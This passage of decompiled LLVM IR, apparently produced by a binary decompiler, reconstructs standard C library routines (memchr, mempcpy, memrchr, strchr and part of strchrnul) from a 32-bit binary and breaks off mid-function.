  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_13f54, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_13f18, { 1, 0 }
  uselistorder label %dec_label_pc_13f04, { 1, 0 }
  uselistorder label %dec_label_pc_13ec4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13e58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13dec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13d8c, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %dec_label_pc_13d5c, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread114, { 1, 0 }
  uselistorder label %dec_label_pc_13cf8, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_13cb8, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_14124 = urem i32 %arg1, 256
  store i32 %v1_14124, i32* @r1, align 4
  %v0_14140.pr = load i32, i32* @r2, align 4
  %v2_1414015 = icmp eq i32 %v0_14140.pr, 0
  %v0_14154.pre = load i32, i32* @r0, align 4
  br i1 %v2_1414015, label %dec_label_pc_14150, label %dec_label_pc_14148

dec_label_pc_1412c:                               ; preds = %dec_label_pc_14148
  %v1_1412c = inttoptr i32 %v0_1413c to i8*
  %v2_1412c = load i8, i8* %v1_1412c, align 1
  %v3_1412c = zext i8 %v2_1412c to i32
  %v9_14130 = icmp eq i32 %v3_1412c, %v1_14124
  br i1 %v9_14130, label %dec_label_pc_14200, label %dec_label_pc_14138

dec_label_pc_14138:                               ; preds = %dec_label_pc_1412c
  %v1_14138 = add i32 %v0_14138, -1
  %v1_1413c = add i32 %v0_1413c, 1
  %v2_14140 = icmp eq i32 %v1_14138, 0
  br i1 %v2_14140, label %dec_label_pc_14150, label %dec_label_pc_14148

dec_label_pc_14148:                               ; preds = %entry, %dec_label_pc_14138
  %v0_14138 = phi i32 [ %v1_14138, %dec_label_pc_14138 ], [ %v0_14140.pr, %entry ]
  %v0_1413c = phi i32 [ %v1_1413c, %dec_label_pc_14138 ], [ %v0_14154.pre, %entry ]
  %v1_14148 = urem i32 %v0_1413c, 4
  %v2_14148 = icmp eq i32 %v1_14148, 0
  br i1 %v2_14148, label %dec_label_pc_14150, label %dec_label_pc_1412c

dec_label_pc_14150:                               ; preds = %dec_label_pc_14138, %dec_label_pc_14148, %entry
  %v0_141cc22 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_14138 ], [ %v0_14138, %dec_label_pc_14148 ]
  %v0_14154 = phi i32 [ %v0_14154.pre, %entry ], [ %v1_1413c, %dec_label_pc_14138 ], [ %v0_1413c, %dec_label_pc_14148 ]
  %v4_14150 = mul nuw nsw i32 %v1_14124, 256
  %v5_14150 = or i32 %v4_14150, %v1_14124
  %v4_14158 = mul i32 %v5_14150, 65536
  %v5_14158 = or i32 %v4_14158, %v5_14150
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_141cc22, 3
  br i1 %tmp, label %dec_label_pc_14160, label %dec_label_pc_141f4.preheader

dec_label_pc_14160:                               ; preds = %dec_label_pc_14150, %dec_label_pc_141cc.backedge
  %v0_1417c60 = phi i32 [ %v1_1417c, %dec_label_pc_141cc.backedge ], [ %v0_141cc22, %dec_label_pc_14150 ]
  %v0_141a059 = phi i32 [ %v4_14160, %dec_label_pc_141cc.backedge ], [ %v0_14154, %dec_label_pc_14150 ]
  %v1_14160 = inttoptr i32 %v0_141a059 to i32*
  %v2_14160 = load i32, i32* %v1_14160, align 4
  %v4_14160 = add i32 %v0_141a059, 4
  %v2_14164 = xor i32 %v2_14160, %v5_14158
  %v2_14168 = add i32 %v2_14164, 2130640639
  %v1_1416c = sub i32 -1, %v2_14164
  %v2_14170 = xor i32 %v2_14168, %v1_1416c
  %v2_14174 = and i32 %v2_14170, -2130640640
  %v2_14178 = icmp eq i32 %v2_14174, 0
  %v1_1417c = add i32 %v0_1417c60, -4
  br i1 %v2_14178, label %dec_label_pc_141cc.backedge, label %dec_label_pc_14184

dec_label_pc_141cc.backedge:                      ; preds = %dec_label_pc_14160, %dec_label_pc_141bc
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_1417c, 3
  br i1 %tmp73, label %dec_label_pc_14160, label %dec_label_pc_141f4.preheader

dec_label_pc_14184:                               ; preds = %dec_label_pc_14160
  %v2_14184 = inttoptr i32 %v0_141a059 to i8*
  %v3_14184 = load i8, i8* %v2_14184, align 1
  %v4_14184 = zext i8 %v3_14184 to i32
  %v9_1418c = icmp eq i32 %v4_14184, %v1_14124
  %v1_14190 = add i32 %v0_141a059, 3
  store i32 %v1_14190, i32* @ip, align 4
  br i1 %v9_1418c, label %dec_label_pc_14200, label %dec_label_pc_14198

dec_label_pc_14198:                               ; preds = %dec_label_pc_14184
  %v1_14198 = add i32 %v0_141a059, 1
  %v2_14198 = inttoptr i32 %v1_14198 to i8*
  %v3_14198 = load i8, i8* %v2_14198, align 1
  %v4_14198 = zext i8 %v3_14198 to i32
  %v9_1419c = icmp eq i32 %v4_14198, %v1_14124
  br i1 %v9_1419c, label %bb, label %dec_label_pc_141ac

bb:                                               ; preds = %dec_label_pc_14198
  br label %dec_label_pc_14200

dec_label_pc_141ac:                               ; preds = %dec_label_pc_14198
  %v1_141ac = add i32 %v0_141a059, 2
  %v2_141ac = inttoptr i32 %v1_141ac to i8*
  %v3_141ac = load i8, i8* %v2_141ac, align 1
  %v4_141ac = zext i8 %v3_141ac to i32
  %v9_141b0 = icmp eq i32 %v4_141ac, %v1_14124
  br i1 %v9_141b0, label %dec_label_pc_14200, label %dec_label_pc_141bc

dec_label_pc_141bc:                               ; preds = %dec_label_pc_141ac
  %v2_141bc = inttoptr i32 %v1_14190 to i8*
  %v3_141bc = load i8, i8* %v2_141bc, align 1
  %v4_141bc = zext i8 %v3_141bc to i32
  %v9_141c0 = icmp eq i32 %v4_141bc, %v1_14124
  br i1 %v9_141c0, label %bb36, label %dec_label_pc_141cc.backedge

bb36:                                             ; preds = %dec_label_pc_141bc
  br label %dec_label_pc_14200

dec_label_pc_141f4.preheader:                     ; preds = %dec_label_pc_141cc.backedge, %dec_label_pc_14150
  %v0_141a0.lcssa = phi i32 [ %v0_14154, %dec_label_pc_14150 ], [ %v4_14160, %dec_label_pc_141cc.backedge ]
  %v0_1417c.lcssa = phi i32 [ %v0_141cc22, %dec_label_pc_14150 ], [ %v1_1417c, %dec_label_pc_141cc.backedge ]
  %v2_141f47 = icmp eq i32 %v0_1417c.lcssa, 0
  br i1 %v2_141f47, label %dec_label_pc_141fc, label %dec_label_pc_141e4

dec_label_pc_141e4:                               ; preds = %dec_label_pc_141f0, %dec_label_pc_141f4.preheader
  %v0_141f4.in = phi i32 [ %v0_141f4, %dec_label_pc_141f0 ], [ %v0_1417c.lcssa, %dec_label_pc_141f4.preheader ]
  %v0_141f0 = phi i32 [ %v1_141f0, %dec_label_pc_141f0 ], [ %v0_141a0.lcssa, %dec_label_pc_141f4.preheader ]
  %v0_141f4 = add i32 %v0_141f4.in, -1
  %v1_141e4 = inttoptr i32 %v0_141f0 to i8*
  %v2_141e4 = load i8, i8* %v1_141e4, align 1
  %v3_141e4 = zext i8 %v2_141e4 to i32
  %v9_141e8 = icmp eq i32 %v3_141e4, %v1_14124
  br i1 %v9_141e8, label %dec_label_pc_14200, label %dec_label_pc_141f0

dec_label_pc_141f0:                               ; preds = %dec_label_pc_141e4
  %v1_141f0 = add i32 %v0_141f0, 1
  %v2_141f4 = icmp eq i32 %v0_141f4, 0
  br i1 %v2_141f4, label %dec_label_pc_141fc, label %dec_label_pc_141e4

dec_label_pc_141fc:                               ; preds = %dec_label_pc_141f0, %dec_label_pc_141f4.preheader
  br label %dec_label_pc_14200

dec_label_pc_14200:                               ; preds = %dec_label_pc_1412c, %dec_label_pc_141ac, %dec_label_pc_14184, %dec_label_pc_141e4, %bb36, %bb, %dec_label_pc_141fc
  %v1_14204 = phi i32 [ 0, %dec_label_pc_141fc ], [ %v1_14198, %bb ], [ %v1_14190, %bb36 ], [ %v0_141f0, %dec_label_pc_141e4 ], [ %v1_141ac, %dec_label_pc_141ac ], [ %v0_141a059, %dec_label_pc_14184 ], [ %v0_1413c, %dec_label_pc_1412c ]
  ret i32 %v1_14204

; uselistorder directives
  uselistorder i32 %v1_1417c, { 1, 0, 2 }
  uselistorder i32 %v0_141a059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_14150, { 1, 0 }
  uselistorder i32 %v0_141cc22, { 1, 2, 0 }
  uselistorder i32 %v0_1413c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_14154.pre, { 1, 0 }
  uselistorder i32 %v1_14124, { 7, 3, 4, 5, 6, 8, 0, 2, 1 }
  uselistorder label %dec_label_pc_14200, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_141cc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_14160, { 1, 0 }
  uselistorder label %dec_label_pc_14150, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14148, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_14210 = load i32, i32* @r4, align 4
  %v6_14210 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_14220 = call i32 @memcpy()
  %v0_14224 = load i32, i32* @r5, align 4
  %v1_14224 = load i32, i32* @r4, align 4
  %v2_14224 = add i32 %v1_14224, %v0_14224
  store i32 %v3_14210, i32* @r4, align 4
  store i32 %v6_14210, i32* @r5, align 4
  ret i32 %v2_14224
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_14238 = urem i32 %arg2, 256
  store i32 %v1_14238, i32* @r1, align 4
  %v2_1423c = add i32 %arg3, %arg1
  %v2_142544 = icmp eq i32 %arg3, 0
  br i1 %v2_142544, label %dec_label_pc_14264, label %dec_label_pc_1425c

dec_label_pc_14244:                               ; preds = %dec_label_pc_1425c
  %v1_14244 = add i32 %v0_14244, -1
  %v2_14244 = inttoptr i32 %v1_14244 to i8*
  %v3_14244 = load i8, i8* %v2_14244, align 1
  %v4_14244 = zext i8 %v3_14244 to i32
  %v9_14248 = icmp eq i32 %v4_14244, %v1_14238
  br i1 %v9_14248, label %dec_label_pc_14304, label %dec_label_pc_14250

dec_label_pc_14250:                               ; preds = %dec_label_pc_14244
  %v1_14250 = add i32 %v0_14250, -1
  %v2_14254 = icmp eq i32 %v1_14250, 0
  br i1 %v2_14254, label %dec_label_pc_14264, label %dec_label_pc_1425c

dec_label_pc_1425c:                               ; preds = %entry, %dec_label_pc_14250
  %v0_14250 = phi i32 [ %v1_14250, %dec_label_pc_14250 ], [ %arg3, %entry ]
  %v0_14244 = phi i32 [ %v1_14244, %dec_label_pc_14250 ], [ %v2_1423c, %entry ]
  %v1_1425c = urem i32 %v0_14244, 4
  %v2_1425c = icmp eq i32 %v1_1425c, 0
  br i1 %v2_1425c, label %dec_label_pc_14264, label %dec_label_pc_14244

dec_label_pc_14264:                               ; preds = %dec_label_pc_14250, %dec_label_pc_1425c, %entry
  %v0_142ec13 = phi i32 [ %v2_1423c, %entry ], [ %v1_14244, %dec_label_pc_14250 ], [ %v0_14244, %dec_label_pc_1425c ]
  %v0_142d89 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_14250 ], [ %v0_14250, %dec_label_pc_1425c ]
  %v4_14264 = mul nuw nsw i32 %v1_14238, 256
  %v5_14264 = or i32 %v4_14264, %v1_14238
  %v4_14268 = mul i32 %v5_14264, 65536
  %v5_14268 = or i32 %v4_14268, %v5_14264
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_142d89, 3
  br i1 %tmp, label %dec_label_pc_14270, label %dec_label_pc_142f8

dec_label_pc_14270:                               ; preds = %dec_label_pc_14264, %dec_label_pc_142d8.backedge
  %v0_1428c40 = phi i32 [ %v1_1428c, %dec_label_pc_142d8.backedge ], [ %v0_142d89, %dec_label_pc_14264 ]
  %v0_1427039 = phi i32 [ %v1_14270, %dec_label_pc_142d8.backedge ], [ %v0_142ec13, %dec_label_pc_14264 ]
  %v1_14270 = add i32 %v0_1427039, -4
  %v2_14270 = inttoptr i32 %v1_14270 to i32*
  %v3_14270 = load i32, i32* %v2_14270, align 4
  %v2_14274 = xor i32 %v3_14270, %v5_14268
  %v2_14278 = add i32 %v2_14274, 2130640639
  store i32 %v2_14278, i32* @ip, align 4
  %v1_1427c = sub i32 -1, %v2_14274
  %v2_14280 = xor i32 %v2_14278, %v1_1427c
  %v2_14284 = and i32 %v2_14280, -2130640640
  %v2_14288 = icmp eq i32 %v2_14284, 0
  %v1_1428c = add i32 %v0_1428c40, -4
  br i1 %v2_14288, label %dec_label_pc_142d8.backedge, label %dec_label_pc_14294

dec_label_pc_142d8.backedge:                      ; preds = %dec_label_pc_14270, %dec_label_pc_142cc
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_1428c, 3
  br i1 %tmp46, label %dec_label_pc_14270, label %dec_label_pc_142f8

dec_label_pc_14294:                               ; preds = %dec_label_pc_14270
  %v1_14294 = add i32 %v0_1427039, -1
  %v2_14294 = inttoptr i32 %v1_14294 to i8*
  %v3_14294 = load i8, i8* %v2_14294, align 1
  %v4_14294 = zext i8 %v3_14294 to i32
  %v9_14298 = icmp eq i32 %v4_14294, %v1_14238
  br i1 %v9_14298, label %dec_label_pc_142c4, label %dec_label_pc_142a4

dec_label_pc_142a4:                               ; preds = %dec_label_pc_14294
  %v1_142a4 = add i32 %v0_1427039, -2
  %v2_142a4 = inttoptr i32 %v1_142a4 to i8*
  %v3_142a4 = load i8, i8* %v2_142a4, align 1
  %v4_142a4 = zext i8 %v3_142a4 to i32
  %v9_142a8 = icmp eq i32 %v4_142a4, %v1_14238
  br i1 %v9_142a8, label %dec_label_pc_142c4, label %dec_label_pc_142b4

dec_label_pc_142b4:                               ; preds = %dec_label_pc_142a4
  %v1_142b4 = add i32 %v0_1427039, -3
  %v2_142b4 = inttoptr i32 %v1_142b4 to i8*
  %v3_142b4 = load i8, i8* %v2_142b4, align 1
  %v4_142b4 = zext i8 %v3_142b4 to i32
  %v9_142b8 = icmp eq i32 %v4_142b4, %v1_14238
  br i1 %v9_142b8, label %dec_label_pc_142c4, label %dec_label_pc_142cc

dec_label_pc_142c4:                               ; preds = %dec_label_pc_142b4, %dec_label_pc_142a4, %dec_label_pc_14294
  %v0_142c4 = phi i32 [ %v1_142b4, %dec_label_pc_142b4 ], [ %v1_142a4, %dec_label_pc_142a4 ], [ %v1_14294, %dec_label_pc_14294 ]
  br label %dec_label_pc_14304

dec_label_pc_142cc:                               ; preds = %dec_label_pc_142b4
  %v1_142cc = inttoptr i32 %v1_14270 to i8*
  %v2_142cc = load i8, i8* %v1_142cc, align 1
  %v3_142cc = zext i8 %v2_142cc to i32
  %v9_142d0 = icmp eq i32 %v3_142cc, %v1_14238
  br i1 %v9_142d0, label %dec_label_pc_14304, label %dec_label_pc_142d8.backedge

dec_label_pc_142ec:                               ; preds = %dec_label_pc_142f8
  %v1_142f8 = add i32 %v0_142f8, -1
  %v1_142ec = add i32 %v0_142ec, -1
  %v2_142ec = inttoptr i32 %v1_142ec to i8*
  %v3_142ec = load i8, i8* %v2_142ec, align 1
  %v4_142ec = zext i8 %v3_142ec to i32
  %v9_142f0 = icmp eq i32 %v4_142ec, %v1_14238
  br i1 %v9_142f0, label %dec_label_pc_14304, label %dec_label_pc_142f8

dec_label_pc_142f8:                               ; preds = %dec_label_pc_14264, %dec_label_pc_142d8.backedge, %dec_label_pc_142ec
  %v0_142ec = phi i32 [ %v1_142ec, %dec_label_pc_142ec ], [ %v0_142ec13, %dec_label_pc_14264 ], [ %v1_14270, %dec_label_pc_142d8.backedge ]
  %v0_142f8 = phi i32 [ %v1_142f8, %dec_label_pc_142ec ], [ %v0_142d89, %dec_label_pc_14264 ], [ %v1_1428c, %dec_label_pc_142d8.backedge ]
  %v2_142f8 = icmp eq i32 %v0_142f8, 0
  br i1 %v2_142f8, label %dec_label_pc_14300, label %dec_label_pc_142ec

dec_label_pc_14300:                               ; preds = %dec_label_pc_142f8
  br label %dec_label_pc_14304

dec_label_pc_14304:                               ; preds = %dec_label_pc_14244, %dec_label_pc_142cc, %dec_label_pc_142ec, %dec_label_pc_142c4, %dec_label_pc_14300
  %v1_14308 = phi i32 [ %v0_142c4, %dec_label_pc_142c4 ], [ 0, %dec_label_pc_14300 ], [ %v1_142ec, %dec_label_pc_142ec ], [ %v1_14270, %dec_label_pc_142cc ], [ %v1_14244, %dec_label_pc_14244 ]
  ret i32 %v1_14308

; uselistorder directives
  uselistorder i32 %v0_142f8, { 1, 0 }
  uselistorder i32 %v1_1428c, { 1, 0, 2 }
  uselistorder i32 %v1_14270, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_1427039, { 3, 2, 1, 0 }
  uselistorder i32 %v5_14264, { 1, 0 }
  uselistorder i32 %v0_142d89, { 1, 2, 0 }
  uselistorder i32 %v0_14244, { 1, 0, 2 }
  uselistorder i32 %v2_1423c, { 1, 0 }
  uselistorder i32 %v1_14238, { 7, 3, 4, 5, 6, 8, 0, 2, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14304, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_142f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_142d8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_14270, { 1, 0 }
  uselistorder label %dec_label_pc_14264, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1425c, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_14318 = urem i32 %arg1, 256
  %v0_143383 = load i32, i32* @r0, align 4
  %v1_143384 = urem i32 %v0_143383, 4
  %v2_143385 = icmp eq i32 %v1_143384, 0
  br i1 %v2_143385, label %dec_label_pc_14340, label %dec_label_pc_14320

dec_label_pc_14320:                               ; preds = %entry, %dec_label_pc_14334
  %v0_14334 = phi i32 [ %v1_14334, %dec_label_pc_14334 ], [ %v0_143383, %entry ]
  %v1_14320 = inttoptr i32 %v0_14334 to i8*
  %v2_14320 = load i8, i8* %v1_14320, align 1
  %v3_14320 = zext i8 %v2_14320 to i32
  store i32 %v3_14320, i32* @r3, align 4
  %v9_14324 = icmp eq i32 %v3_14320, %v1_14318
  br i1 %v9_14324, label %dec_label_pc_143f4, label %dec_label_pc_1432c

dec_label_pc_1432c:                               ; preds = %dec_label_pc_14320
  %v2_1432c = icmp eq i8 %v2_14320, 0
  br i1 %v2_1432c, label %dec_label_pc_143f0, label %dec_label_pc_14334

dec_label_pc_14334:                               ; preds = %dec_label_pc_1432c
  %v1_14334 = add i32 %v0_14334, 1
  %v1_14338 = urem i32 %v1_14334, 4
  %v2_14338 = icmp eq i32 %v1_14338, 0
  br i1 %v2_14338, label %dec_label_pc_14340, label %dec_label_pc_14320

dec_label_pc_14340:                               ; preds = %dec_label_pc_14334, %entry
  %v0_14344 = phi i32 [ %v0_143383, %entry ], [ %v1_14334, %dec_label_pc_14334 ]
  %v4_14340 = mul nuw nsw i32 %v1_14318, 256
  %v5_14340 = or i32 %v4_14340, %v1_14318
  %v4_14348 = mul i32 %v5_14340, 65536
  %v5_14348 = or i32 %v4_14348, %v5_14340
  br label %dec_label_pc_1434c

dec_label_pc_1434c:                               ; preds = %dec_label_pc_143e8, %dec_label_pc_14388, %dec_label_pc_14340
  %v0_143b0 = phi i32 [ %v0_14344, %dec_label_pc_14340 ], [ %v4_1434c, %dec_label_pc_14388 ], [ %v4_1434c, %dec_label_pc_143e8 ]
  %v1_1434c = inttoptr i32 %v0_143b0 to i32*
  %v2_1434c = load i32, i32* %v1_1434c, align 4
  %v4_1434c = add i32 %v0_143b0, 4
  %v2_14354 = xor i32 %v2_1434c, %v5_14348
  %v2_14358 = add i32 %v2_14354, 2130640639
  store i32 %v2_14358, i32* @ip, align 4
  %v2_14360 = add i32 %v2_1434c, 2130640639
  %v1_14364 = sub i32 -1, %v2_1434c
  %v2_14368 = xor i32 %v2_14360, %v1_14364
  %v2_14374 = and i32 %v2_14368, -2130640640
  store i32 %v2_14374, i32* @r1, align 4
  %v2_1437c = icmp eq i32 %v2_14374, 0
  br i1 %v2_1437c, label %dec_label_pc_14388, label %dec_label_pc_14390

dec_label_pc_14388:                               ; preds = %dec_label_pc_1434c
  %v1_14370 = sub i32 -1, %v2_14354
  %v2_14378 = xor i32 %v2_14358, %v1_14370
  %v2_14380 = and i32 %v2_14378, -2130640640
  %v2_14388 = icmp eq i32 %v2_14380, 0
  br i1 %v2_14388, label %dec_label_pc_1434c, label %dec_label_pc_14390

dec_label_pc_14390:                               ; preds = %dec_label_pc_1434c, %dec_label_pc_14388
  %v2_14390 = inttoptr i32 %v0_143b0 to i8*
  %v3_14390 = load i8, i8* %v2_14390, align 1
  %v4_14390 = zext i8 %v3_14390 to i32
  store i32 %v4_14390, i32* @r3, align 4
  %v9_14394 = icmp eq i32 %v4_14390, %v1_14318
  br i1 %v9_14394, label %dec_label_pc_143f4, label %dec_label_pc_143a0

dec_label_pc_143a0:                               ; preds = %dec_label_pc_14390
  %v2_143a0 = icmp eq i8 %v3_14390, 0
  br i1 %v2_143a0, label %dec_label_pc_143f0, label %dec_label_pc_143a8

dec_label_pc_143a8:                               ; preds = %dec_label_pc_143a0
  %v1_143a8 = add i32 %v0_143b0, 1
  %v2_143a8 = inttoptr i32 %v1_143a8 to i8*
  %v3_143a8 = load i8, i8* %v2_143a8, align 1
  %v4_143a8 = zext i8 %v3_143a8 to i32
  store i32 %v4_143a8, i32* @r3, align 4
  %v9_143ac = icmp eq i32 %v4_143a8, %v1_14318
  br i1 %v9_143ac, label %dec_label_pc_143f4, label %dec_label_pc_143b8

dec_label_pc_143b8:                               ; preds = %dec_label_pc_143a8
  %v2_143b8 = icmp eq i8 %v3_143a8, 0
  br i1 %v2_143b8, label %dec_label_pc_143f0, label %dec_label_pc_143c0

dec_label_pc_143c0:                               ; preds = %dec_label_pc_143b8
  %v1_143c0 = add i32 %v0_143b0, 2
  %v2_143c0 = inttoptr i32 %v1_143c0 to i8*
  %v3_143c0 = load i8, i8* %v2_143c0, align 1
  %v4_143c0 = zext i8 %v3_143c0 to i32
  store i32 %v4_143c0, i32* @r3, align 4
  %v9_143c4 = icmp eq i32 %v4_143c0, %v1_14318
  br i1 %v9_143c4, label %dec_label_pc_143f4, label %dec_label_pc_143d0

dec_label_pc_143d0:                               ; preds = %dec_label_pc_143c0
  %v2_143d0 = icmp eq i8 %v3_143c0, 0
  br i1 %v2_143d0, label %dec_label_pc_143f0, label %dec_label_pc_143d8

dec_label_pc_143d8:                               ; preds = %dec_label_pc_143d0
  %v1_143d8 = add i32 %v0_143b0, 3
  %v2_143d8 = inttoptr i32 %v1_143d8 to i8*
  %v3_143d8 = load i8, i8* %v2_143d8, align 1
  %v4_143d8 = zext i8 %v3_143d8 to i32
  store i32 %v4_143d8, i32* @r3, align 4
  %v9_143dc = icmp eq i32 %v4_143d8, %v1_14318
  br i1 %v9_143dc, label %dec_label_pc_143f4, label %dec_label_pc_143e8

dec_label_pc_143e8:                               ; preds = %dec_label_pc_143d8
  %v2_143e8 = icmp eq i8 %v3_143d8, 0
  br i1 %v2_143e8, label %dec_label_pc_143f0, label %dec_label_pc_1434c

dec_label_pc_143f0:                               ; preds = %dec_label_pc_1432c, %dec_label_pc_143e8, %dec_label_pc_143d0, %dec_label_pc_143b8, %dec_label_pc_143a0
  br label %dec_label_pc_143f4

dec_label_pc_143f4:                               ; preds = %dec_label_pc_14320, %dec_label_pc_143d8, %dec_label_pc_143c0, %dec_label_pc_143a8, %dec_label_pc_14390, %dec_label_pc_143f0
  %v1_143f8 = phi i32 [ 0, %dec_label_pc_143f0 ], [ %v1_143d8, %dec_label_pc_143d8 ], [ %v1_143c0, %dec_label_pc_143c0 ], [ %v1_143a8, %dec_label_pc_143a8 ], [ %v0_143b0, %dec_label_pc_14390 ], [ %v0_14334, %dec_label_pc_14320 ]
  ret i32 %v1_143f8

; uselistorder directives
  uselistorder i32 %v4_1434c, { 1, 0 }
  uselistorder i32 %v2_1434c, { 0, 2, 1 }
  uselistorder i32 %v0_143b0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_14340, { 1, 0 }
  uselistorder i32 %v1_14334, { 1, 0, 2 }
  uselistorder i32 %v0_143383, { 2, 1, 0 }
  uselistorder i32 %v1_14318, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_143f4, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_143f0, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_14390, { 1, 0 }
  uselistorder label %dec_label_pc_14320, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_14408 = urem i32 %arg1, 256
  %v0_144282 = load i32, i32* @r0, align 4
  %v1_144283 = urem i32 %v0_144282, 4
  %v2_144284 = icmp eq i32 %v1_144283, 0
  br i1 %v2_144284, label %dec_label_pc_14430, label %dec_label_pc_14410

dec_label_pc_14410:                               ; preds = %entry, %dec_label_pc_14424
  %v0_14424 = phi i32 [ %v1_14424, %dec_label_pc_14424 ], [ %v0_144282, %entry ]
  %v1_14410 = inttoptr i32 %v0_14424 to i8*
  %v2_14410 = load i8, i8* %v1_14410, align 1
  %v3_14410 = zext i8 %v2_14410 to i32
  %v9_14414 = icmp eq i32 %v3_14410, %v1_14408
  br i1 %v9_14414, label %dec_label_pc_144e0, label %dec_label_pc_1441c

dec_label_pc_1441c:                               ; preds = %dec_label_pc_14410
  %v2_1441c = icmp eq i8 %v2_14410, 0
  br i1 %v2_1441c, label %dec_label_pc_144e0, label %dec_label_pc_14424

dec_label_pc_14424:                               ; preds = %dec_label_pc_1441c
  %v1_14424 = add i32 %v0_14424, 1
  %v1_14428 = urem i32 %v1_14424, 4
  %v2_14428 = icmp eq i32 %v1_14428, 0
  br i1 %v2_14428, label %dec_label_pc_14430, label %dec_label_pc_14410

dec_label_pc_14430:                               ; preds = %dec_label_pc_14424, %entry
  %v0_14434 = phi i32 [ %v0_144282, %entry ], [ %v1_14424, %dec_label_pc_14424 ]
  %v4_14430 = mul nuw nsw i32 %v1_14408, 256
  %v5_14430 = or i32 %v4_14430, %v1_14408
  %v4_14438 = mul i32 %v5_14430, 65536
  %v5_14438 = or i32 %v4_14438, %v5_14430
  br label %dec_label_pc_1443c

dec_label_pc_1443c:                               ; preds = %dec_label_pc_144d8, %dec_label_pc_14478, %dec_label_pc_14430
  %v0_144a0 = phi i32 [ %v0_14434, %dec_label_pc_14430 ], [ %v4_1443c, %dec_label_pc_14478 ], [ %v4_1443c, %dec_label_pc_144d8 ]
  %v1_1443c = inttoptr i32 %v0_144a0 to i32*
  %v2_1443c = load i32, i32* %v1_1443c, align 4
  %v4_1443c = add i32 %v0_144a0, 4
  %v2_14444 = xor i32 %v2_1443c, %v5_14438
  %v2_14448 = add i32 %v2_14444, 2130640639
  store i32 %v2_14448, i32* @ip, align 4
  %v2_14450 = add i32 %v2_1443c, 2130640639
  %v1_14454 = sub i32 -1, %v2_1443c
  %v2_14458 = xor i32 %v2_14450, %v1_14454
  %v2_14464 = and i32 %v2_14458, -2130640640
  store i32 %v2_14464, i32* @r1, align 4
  %v2_1446c = icmp eq i32 %v2_14464, 0
  br i1 %v2_1446c, label %dec_label_pc_14478, label %dec_label_pc_14480

dec_label_pc_14478:                               ; preds = %dec_label_pc_1443c
  %v1_14460 = sub i32 -1, %v2_14444
  %v2_14468 = xor i32 %v2_14448, %v1_14460
  %v2_14470 = and i32 %v2_14468, -2130640640
  %v2_14478 = icmp eq i32 %v2_14470, 0
  br i1 %v2_14478, label %dec_label_pc_1443c, label %dec_label_pc_14480

dec_label_pc_14480:                               ; preds = %dec_label_pc_1443c, %dec_label_pc_14478
  %v2_14480 = inttoptr i32 %v0_144a0 to i8*
  %v3_14480 = load i8, i8* %v2_14480, align 1
  %v4_14480 = zext i8 %v3_14480 to i32
  %v9_14484 = icmp eq i32 %v4_14480, %v1_14408
  br i1 %v9_14484, label %dec_label_pc_144e0, label %dec_label_pc_14490

dec_label_pc_14490:                               ; preds = %dec_label_pc_14480
  %v2_14490 = icmp eq i8 %v3_14480, 0
  br i1 %v2_14490, label %dec_label_pc_144e0, label %dec_label_pc_14498

dec_label_pc_14498:                               ; preds = %dec_label_pc_14490
  %v1_14498 = add i32 %v0_144a0, 1
  %v2_14498 = inttoptr i32 %v1_14498 to i8*
  %v3_14498 = load i8, i8* %v2_14498, align 1
  %v4_14498 = zext i8 %v3_14498 to i32
  %v9_1449c = icmp eq i32 %v4_14498, %v1_14408
